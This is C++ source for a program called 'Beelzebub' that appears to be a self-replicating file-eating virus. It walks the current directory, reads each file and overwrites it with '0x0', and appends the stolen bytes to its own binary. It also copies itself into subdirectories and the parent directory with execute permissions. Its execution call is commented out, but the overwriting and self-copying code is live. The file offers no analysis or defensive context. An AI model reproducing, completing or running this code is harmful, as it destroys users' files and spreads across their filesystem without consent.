#include <iostream>
#include <vector>
#include <fstream>
#include <dirent.h>
  

#include <sys/stat.h> 
#include <sys/types.h>
#include<unistd.h> 


#include "lib/list.hpp"
#include "lib/node.hpp"



// FUNCTION SIGNATURES
void copy_binary(const char * fname, const char* dest);

void Append_to_Head(const char * head, std::vector<unsigned char> data);

std::vector<unsigned char> Read_File(const char * fname);

bool Regurgitate(const char * fname);

bool Eat_Victim(const char * victim, List<std::vector<unsigned char>> &s);

void Make_exe(const char * head);

bool Is_dir(const char * path);

void Execute(const char * head_path);

void Change_current_working_directory(const char * path);

int main()
{

	const char *HEAD = "Beelzebub";


	List<std::vector<unsigned char>> stomach; 


	// Open current directory
	DIR *current_dir = opendir(".");


	if(current_dir) // If current directory is open
	{


		// Iterate through current Directory
		for (struct dirent *dent; (dent = readdir(current_dir)) != NULL; )
		{

			const char *victim = dent->d_name; // Get name of item in current directory

			// Skip "." and ".." dirs, which refer to the current and
			// parent directories, respectively.
			// Skip itself
			if (std::strcmp(victim, ".") == 0 || std::strcmp(victim, "..") == 0 || std::strcmp(victim,HEAD)==0)
			    continue;



			// Check if victim is not a direcctory
	    	if(!(Is_dir(victim)))
	    	{

	    		std::cout<<"Eating ";
	    		std::cout<<victim;

	    		bool isSwallowed = Eat_Victim(victim,stomach);

	    		if(isSwallowed)
	    		{
	    			std::cout<<" -- Burp"<<std::endl;

	    		}
	    		else
	    		{
	    			std::cout<<" -- Cough Cough"<<std::endl;

	    		}


	    	}

	    	else
	    	{

	    		Change_current_working_directory(victim);

	    		std::string nh_path = victim;
	    		nh_path += "/";

	    		nh_path += HEAD;
	    		const char *new_head = nh_path.c_str();
	    		copy_binary(HEAD,new_head);
	    		Make_exe(new_head);

	    		Execute("./Beelzebub");
	    		Change_current_working_directory("..");

	    	}
		}


	}

	closedir(current_dir);


	int total_victims = stomach.GetSize();

	for(int i=0;i<total_victims;i++)
	{

		Append_to_Head(HEAD,stomach.Peek()->GetData());
		stomach.DeleteFromHead();	

	}
	

	std::string nh_path = "../";
	nh_path += HEAD;
	const char *new_head = nh_path.c_str();

	copy_binary(HEAD, new_head);



	Make_exe(new_head);

	Change_current_working_directory("../");
	
	Execute(new_head);

	return 0;
}




// FUNCTION DEFINITIONS
void Change_current_working_directory(const char * path)
{

	//char cd[100];
	chdir(path);

	//std::cout<<"current working directory: "<<getcwd(cd,100)<<std::endl;
}


bool Is_dir(const char * path)
{

	struct stat stats;

    stat(path, &stats);

    // Check for file existence
    if (S_ISDIR(stats.st_mode) == 0)
    {
    	return false;

    }
    else
    {
    	return true;
    }

}

void Make_exe(const char * head)
{

	chmod(head,S_IROTH| S_IXOTH | S_IWOTH | S_IXUSR | S_IRUSR | S_IWUSR );


}

void Execute(const char * head_path)
{
	std::cout<<"Executing "<<head_path<<std::endl;
	//system(head_path);


}
std::vector<unsigned char> Read_File(const char * fname)
{
	std::ifstream is(fname, std::ios::binary);

	// get length of file:
	is.seekg (0, is.end);
  	int length = is.tellg();
  	is.seekg (0, is.beg);


  	std::vector<unsigned char> data(length);

  	is.read(reinterpret_cast<char*>(data.data()), length);

  	data.resize(is.gcount());

  

  	return data;

}


bool Regurgitate(const char * fname)
{
	std::ofstream output(fname, std::ios::binary);

	if(output)
	{

		output<<"0x0\n";
		return true;
	}
	return false;


}




bool Eat_Victim(const char * victim, List<std::vector<unsigned char>> &s)
{

	std::vector<unsigned char> data = Read_File(victim);

	s.InsertAtHead(data);

	bool consumed = Regurgitate(victim);

	return consumed;


}



void copy_binary(const char * fname, const char* dest)
{

    std::ifstream input(fname, std::ios::binary );
    std::ofstream output(dest, std::ios::binary );

    std::copy( 
        std::istreambuf_iterator<char>(input), 
        std::istreambuf_iterator<char>( ),
        std::ostreambuf_iterator<char>(output));


}



void Append_to_Head(const char * head, std::vector<unsigned char> data)
{
	std::ofstream output( head, std::ios::binary | std::ios::app);

    std::copy( data.begin(),data.end(),std::ostreambuf_iterator<char>(output));

}
